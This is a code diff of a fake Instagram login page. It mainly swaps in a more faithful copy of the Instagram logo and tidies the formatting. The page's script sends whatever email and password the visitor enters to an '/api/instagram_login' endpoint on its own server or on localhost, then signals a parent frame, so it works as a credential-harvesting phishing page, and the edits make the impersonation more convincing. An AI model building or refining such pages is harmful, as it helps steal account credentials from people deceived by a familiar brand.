@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Log in to Instagram</title>
     <style>
         * {
@@ -32,10 +33,13 @@
         }
 
         .instagram-logo {
-            width: 90px;
-            height: 90px;
+            width: 68px;
+            height: 68px;
             margin-bottom: 18px;
-        }
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+}
 
         h1 {
             font-size: 29px;
@@ -99,36 +103,43 @@
         }
     </style>
 </head>
-<body>
 
+<body>
     <div class="login-container">
-        <!-- More Accurate Instagram Logo -->
-        <svg class="instagram-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+
+        <svg class="instagram-logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
             <defs>
-                <linearGradient id="igGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                    <stop offset="0%" stop-color="#F56040"/>
-                    <stop offset="20%" stop-color="#F77737"/>
-                    <stop offset="40%" stop-color="#E1306C"/>
-                    <stop offset="60%" stop-color="#C13584"/>
-                    <stop offset="80%" stop-color="#833AB4"/>
-                    <stop offset="100%" stop-color="#5851DB"/>
+                <radialGradient id="ig-radial" cx="30%" cy="107%" r="120%" fx="30%" fy="107%">
+                    <stop offset="0%" stop-color="#ffd676" />
+                    <stop offset="15%" stop-color="#f9a844" />
+                    <stop offset="30%" stop-color="#f47033" />
+                    <stop offset="45%" stop-color="#e23462" />
+                    <stop offset="65%" stop-color="#c22f96" />
+                    <stop offset="80%" stop-color="#8b37b8" />
+                    <stop offset="100%" stop-color="#4e60d3" />
+                </radialGradient>
+                <linearGradient id="ig-overlay" x1="100%" y1="0%" x2="0%" y2="100%">
+                    <stop offset="0%" stop-color="#4e60d3" stop-opacity="0.6" />
+                    <stop offset="40%" stop-color="#8b37b8" stop-opacity="0.3" />
+                    <stop offset="100%" stop-color="#ffd676" stop-opacity="0" />
                 </linearGradient>
             </defs>
-            
-            <!-- Main Square -->
-            <rect width="24" height="24" rx="6" fill="url(#igGradient)"/>
-            
-            <!-- White Border -->
-            <rect x="1.8" y="1.8" width="20.4" height="20.4" rx="5.5" fill="none" stroke="#ffffff" stroke-width="1.4"/>
-            
-            <!-- Outer Circle -->
-            <circle cx="12" cy="12" r="5.8" fill="none" stroke="#ffffff" stroke-width="1.7"/>
-            
-            <!-- Inner Circle -->
-            <circle cx="12" cy="12" r="2.4" fill="#ffffff"/>
-            
-            <!-- Top-right small circle -->
-            <circle cx="17.2" cy="6.8" r="1.35" fill="#ffffff"/>
+
+            <!-- Background -->
+            <rect width="200" height="200" rx="46" ry="46" fill="url(#ig-radial)" />
+            <rect width="200" height="200" rx="46" ry="46" fill="url(#ig-overlay)" />
+
+            <!-- Camera body outline -->
+            <rect x="28" y="28" width="144" height="144" rx="36" ry="36" fill="none" stroke="white" stroke-width="11" />
+
+            <!-- Lens outer ring -->
+            <circle cx="100" cy="103" r="40" fill="none" stroke="white" stroke-width="11" />
+
+            <!-- Lens inner circle -->
+            <circle cx="100" cy="103" r="19" fill="white" />
+
+            <!-- Viewfinder dot -->
+            <circle cx="148" cy="56" r="10" fill="white" />
         </svg>
 
         <h1>Log in to Instagram</h1>
@@ -154,13 +165,11 @@
             try {
                 const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
                 const endpoint = apiHost + '/api/instagram_login';
-                
                 await fetch(endpoint, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
                 });
-                
                 window.parent.postMessage({ type: 'INSTAGRAM_LOGIN_DONE' }, '*');
             } catch (error) {
                 console.error(error);
@@ -168,12 +177,9 @@
             }
         }
 
-        document.addEventListener('keypress', function(e) {
-            if (e.key === "Enter") {
-                login();
-            }
+        document.addEventListener('keypress', function (e) {
+            if (e.key === "Enter") login();
         });
     </script>
-
 </body>
 </html>
